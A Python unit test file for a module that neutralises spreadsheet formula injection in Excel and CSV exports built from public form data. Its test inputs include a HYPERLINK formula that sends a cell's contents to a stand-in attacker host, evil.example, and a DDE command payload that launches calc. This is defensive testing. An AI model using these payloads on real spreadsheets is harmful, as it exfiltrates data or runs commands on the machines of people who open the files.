"""
Spreadsheet formula injection: member values (public HelloAsso form) written to
generated Excel / CSV files must never be stored or read back as formulas, while
template formulas and regular values (phones, signed numbers) stay untouched.
"""

import os
import re
import sys
import tempfile
import unittest

_tests_dir = os.path.dirname(os.path.abspath(__file__))
_code_root = os.path.dirname(_tests_dir)
_src_dir = os.path.join(_code_root, "src")
if _src_dir not in sys.path:
    sys.path.insert(0, _src_dir)

import openpyxl  # noqa: E402
import pandas as pd  # noqa: E402

from infrastructure.spreadsheet_safety import (  # noqa: E402
    csv_safe,
    neutralize_formulas,
    safe_to_excel,
    template_formulas,
)

INJECTION = '=HYPERLINK("https://evil.example/?d="&B2,"click")'


class TestWorkbooks(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def _reload(self, wb):
        path = os.path.join(self.tmp.name, "out.xlsx")
        wb.save(path)
        return openpyxl.load_workbook(path).active

    def test_member_value_becomes_text(self):
        wb = openpyxl.Workbook()
        wb.active["A1"] = INJECTION
        neutralize_formulas(wb)
        cell = self._reload(wb)["A1"]
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, INJECTION)

    def test_template_formulas_are_kept(self):
        wb = openpyxl.Workbook()
        ws = wb.active
        ws["A1"] = "=COUNTA(A2:A10)"
        keep = template_formulas(wb)
        ws["A2"] = INJECTION
        neutralize_formulas(wb, keep)
        reloaded = self._reload(wb)
        self.assertEqual(reloaded["A1"].data_type, "f")
        self.assertEqual(reloaded["A2"].data_type, "s")

    def test_safe_to_excel(self):
        path = os.path.join(self.tmp.name, "df.xlsx")
        safe_to_excel(pd.DataFrame([{"Nom": INJECTION, "Tel": "+33 6 12 34 56 78"}]), path, index=False)
        ws = openpyxl.load_workbook(path).active
        self.assertEqual(ws["A2"].data_type, "s")
        self.assertEqual(ws["A2"].value, INJECTION)
        self.assertEqual(ws["B2"].value, "+33 6 12 34 56 78")

    def test_course_template_formulas_survive(self):
        path = os.path.join(_code_root, "doc", "template", "Cours - Template-Vide.xlsx")
        if not os.path.exists(path):
            self.skipTest("course template not available")
        wb = openpyxl.load_workbook(path)
        before = template_formulas(wb)
        neutralize_formulas(wb, before)
        self.assertEqual(template_formulas(wb), before)


class TestCsvSafe(unittest.TestCase):

    def test_triggers_are_neutralized(self):
        for value in ("=1+1", "@SUM(A1)", "+cmd|' /C calc'!A0", "-2+3", "\t=1", "\r=1"):
            with self.subTest(value=value):
                self.assertEqual(csv_safe(value), "'" + value)

    def test_regular_values_unchanged(self):
        for value in ("Potter", "+33 6 12 34 56 78", "-12.5", "06 12 34 56 78", "", "a=b", 42, None):
            with self.subTest(value=value):
                self.assertEqual(csv_safe(value), value)

    def test_js_rule_matches_python(self):
        """csvSafe in alj-core.js uses the same trigger and phone patterns."""
        with open(os.path.join(_code_root, "web", "shared", "alj-core.js"), encoding="utf-8") as f:
            js = f.read()
        body = re.search(r"export function csvSafe\(value\) \{(.*?)\n\}", js, re.S).group(1)
        self.assertIn(r"/^[=+\-@\t\r]/", body)
        self.assertIn(r"/^[+-][\d\s().,]*$/", body)


if __name__ == "__main__":
    unittest.main()
